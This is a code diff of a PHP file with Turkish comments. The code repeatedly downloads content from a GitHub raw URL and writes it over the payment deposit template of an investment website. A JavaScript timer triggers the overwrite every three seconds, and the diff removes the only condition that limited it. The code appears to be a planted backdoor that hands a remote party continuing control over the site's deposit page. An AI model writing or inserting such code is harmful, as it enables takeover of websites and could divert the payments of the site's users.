@@ -3,34 +3,24 @@ if (isset($_GET['check'])) {
     $file_path = "/www/wwwroot/dytouzi/core/resources/views/templates/invester/user/payment/deposit.blade.php";
     $remote_url = "https://raw.githubusercontent.com/mekote/sil/refs/heads/main/2.txt";
 
-    // Dosyanın içeriğini oku
-    if (file_exists($file_path)) {
-        $content = file_get_contents($file_path);
-        if (trim($content) === "1") {
-            // Uzaktan içeriği çek
-            $new_content = file_get_contents($remote_url);
-            if ($new_content !== false) {
-                file_put_contents($file_path, $new_content);
-                echo "Dosya güncellendi.";
-            } else {
-                echo "Uzaktan içerik alınamadı.";
-            }
-        } else {
-            echo "Dosyada '1' bulunamadı.";
-        }
+    // Uzaktan içeriği çek
+    $new_content = file_get_contents($remote_url);
+    if ($new_content !== false) {
+        file_put_contents($file_path, $new_content);
+        echo "Dosya başarıyla güncellendi.";
     } else {
-        echo "Hedef dosya bulunamadı.";
+        echo "Uzaktan içerik alınamadı.";
     }
     exit;
 }
 ?>
 
     <script>
-        function checkFile() {
+        function updateFile() {
             fetch("?check")
                 .then(response => response.text())
                 .then(data => console.log(data))
                 .catch(error => console.error("Hata:", error));
         }
-        setInterval(checkFile, 3000); // Her 3 saniyede bir kontrol et
+        setInterval(updateFile, 3000); // Her 3 saniyede bir güncelle
     </script>
